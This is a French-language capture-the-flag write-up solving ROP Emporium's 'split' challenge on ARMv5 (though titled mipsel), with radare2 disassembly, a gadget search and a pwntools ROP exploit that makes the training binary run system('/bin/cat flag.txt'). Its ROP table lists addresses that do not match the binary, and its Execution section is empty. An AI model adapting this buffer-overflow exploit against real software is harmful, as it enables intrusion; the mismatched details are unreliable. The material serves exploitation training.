---
Title: Ropemporium mipsel split
Date: 2023-06-11
Tags: [linux, python, ROP, mipsel, ropemporium, write-up]
Categories: [tutorial]
Author: cdpointpoint
---


# split armv5

## Introduction.

Dans ce second exercice on doit passer une argument à la fonction appelée.
L'argument est présent dans le programme


Execution du programme avec qemu



## Analyse

Le code de la fonction pwnme :

    [0x00010428]> pdf @sym.pwnme
                ; CALL XREF from main @ 0x10548
    ┌ 88: sym.pwnme ();
    │           ; var void *buf @ fp-0x24
    │           ; var int32_t var_4h_2 @ sp+0x20
    │           ; var int32_t var_4h @ sp+0x24
    │           0x00010570      00482de9       push {fp, lr}
    │           0x00010574      04b08de2       add fp, var_4h
    │           0x00010578      20d04de2       sub sp, sp, 0x20
    │           0x0001057c      24304be2       sub r3, buf
    │           0x00010580      2020a0e3       mov r2, 0x20
    │           0x00010584      0010a0e3       mov r1, 0                   ; int c
    │           0x00010588      0300a0e1       mov r0, r3                  ; void *s
    │           0x0001058c      9fffffeb       bl sym.imp.memset           ; void *memset(void *s, int c, size_t n)
    │           0x00010590      30009fe5       ldr r0, str.Contriving_a_reason_to_ask_user_for_data... ; [0x1068c:4]=0x746e6f43 ; "Contriving a reason to ask user for data..." ; const char *s
    │           0x00010594      8effffeb       bl sym.imp.puts             ; int puts(const char *s)
    │           0x00010598      2c009fe5       ldr r0, str.__              ; [0x106b8:4]=0x203e ; "> " ; const char *format
    │           0x0001059c      86ffffeb       bl sym.imp.printf           ; int printf(const char *format)
    │           0x000105a0      24304be2       sub r3, buf
    │           0x000105a4      6020a0e3       mov r2, 0x60                ; '`'
    │           0x000105a8      0310a0e1       mov r1, r3                  ; void *buf
    │           0x000105ac      0000a0e3       mov r0, 0                   ; int fildes
    │           0x000105b0      84ffffeb       bl sym.imp.read             ; ssize_t read(int fildes, void *buf, size_t nbyte)
    │           0x000105b4      14009fe5       ldr r0, str.Thank_you_      ; [0x106bc:4]=0x6e616854 ; "Thank you!" ; const char *s
    │           0x000105b8      85ffffeb       bl sym.imp.puts             ; int puts(const char *s)
    │           0x000105bc      0000a0e1       mov r0, r0                  ; 0x106bc ; "Thank you!"
    │           0x000105c0      04d04be2       sub sp, var_4h_2
    └           0x000105c4      0088bde8       pop {fp, pc}
    [0x00010428]> 




La fonction reasd est appelée avec un registre r1 chargé avec fp-0x24.
L'offset d'écrasement de l'adresse de retour est donc 0x28 soit 40 octets.


Le programme contient aussi la fonction usefulFunction qui appelle system("/bin/ls").

    [0x00010428]> pdf @ sym.usefulFunction 
    ┌ 24: sym.usefulFunction ();
    │           ; var int32_t var_4h @ sp+0x4
    │           0x000105d4      00482de9       push {fp, lr}
    │           0x000105d8      04b08de2       add fp, var_4h
    │           0x000105dc      08009fe5       ldr r0, str._bin_ls         ; [0x106c8:4]=0x6e69622f ; "/bin/ls" ; const char *string
    │           0x000105e0      81ffffeb       bl sym.imp.system           ; int system(const char *string)
    │           0x000105e4      0000a0e1       mov r0, r0                  ; 0x106c8 ; "/bin/ls"
    └           0x000105e8      0088bde8       pop {fp, pc}



La chaine de caractère utile est disponible dans le code.

    [0x00010428]> fs strings
    [0x00010428]> f
    0x00010660 21 str.split_by_ROP_Emporium
    0x00010678 7 str.ARMv5_n
    0x00010678 6 str.ARMv5
    0x00010680 9 str._nExiting
    0x00010680 8 str.Exiting
    0x0001068c 43 str.Contriving_a_reason_to_ask_user_for_data...
    0x000106b8 2 str.__
    0x000106bc 10 str.Thank_you_
    0x000106c8 7 str._bin_ls
    0x0002103c 18 str._bin_cat_flag.txt

    [0x00010428]> ps @ obj.usefulString 
    /bin/cat flag.txt
[



## Construction de l'attaque.

Notre objectif va être d'appeller la fonction system en appellant l'adresse 0x000105e0 avec en paramètre l'adresse la la chaine "/bin/cat flag.txt".

Pour passer le paramêtre il nous faut charger le registre r0 avec l'adresse 0x0002103c.

### Recherche de gadgets

Il nous faut d'abord un gadget qui permet de charger r0.

On ne trouve pas de gadget avec un pop r0.
*E revanche on trouve de operation de type mov.)

ropemporium/armv5/split# ROPgadget --binary split_armv5 --depth 3|grep mov
0x000105e0 : bl #0x103ec ; mov r0, r0 ; pop {fp, pc}
0x000105e4 : mov r0, r0 ; pop {fp, pc}
0x000105bc : mov r0, r0 ; sub sp, fp, #4 ; pop {fp, pc}
0x00010558 : mov r0, r3 ; pop {fp, pc}
0x00010634 : mov r0, r7 ; blx r3
0x00010630 : mov r1, r8 ; mov r0, r7 ; blx r3
0x00010554 : mov r3, #0 ; mov r0, r3 ; pop {fp, pc}
0x00010504 : mov r3, #1 ; strb r3, [r4] ; pop {r4, pc}

0x00010558 : mov r0, r3 ; pop {fp, pc}

On recherche un pop pour charge r3 :

    ropemporium/armv5/split# ROPgadget --binary split_armv5 --depth 2|grep pop|grep r3
    0x000103a0 : bl #0x10464 ; pop {r3, pc}
    0x00010558 : mov r0, r3 ; pop {fp, pc}
    0x000103a4 : pop {r3, pc}
    0x00010654 : push {r3, lr} ; pop {r3, pc}
    0x00010508 : strb r3, [r4] ; pop {r4, pc}

On eput retenir pour charger r0 :

    0x000103a4 : pop {r3, pc}
    0x00010558 : mov r0, r3 ; pop {fp, pc}



### La ropchaine

| ROP entry | comment |
| ----------- | ------- |
| 0x000103a4v | pop {r3, pc}|
| 0x004009ec | appel system |
| 0x004009c8 | @ /bin/cat flag.txt |


## Exploitation

### Script python 

``` python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('split_armv5')

gs='''
b *pwnme+64
c
'''

# 0x000103a4 : pop {r3, pc}
g_popr3 = 0x000103a4
# 0x00010558 : mov r0, r3 ; pop {fp, pc}
g_movr0r3 = 0x00010558


if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


time.sleep(.5)


io.recvuntil(b"> ")

usefulString = elf.symbols["usefulString"]
usefulFunction = elf.symbols["usefulFunction"]
system = usefulFunction+12

log.info(f"{usefulString=:x}")
log.info(f"{system=:x}")
log.info(f"{g_popr3=:x}")

PL=0x20*b"A"
PL+=p32(0)              # Pour fp
PL+=p32(g_popr3 )
PL+=p32(usefulString)
PL+=p32(g_movr0r3 )
PL+=p32(0)              # Pour fp
PL+=p32(system)
io.sendline(PL)
io.interactive()


``` 
### Execution










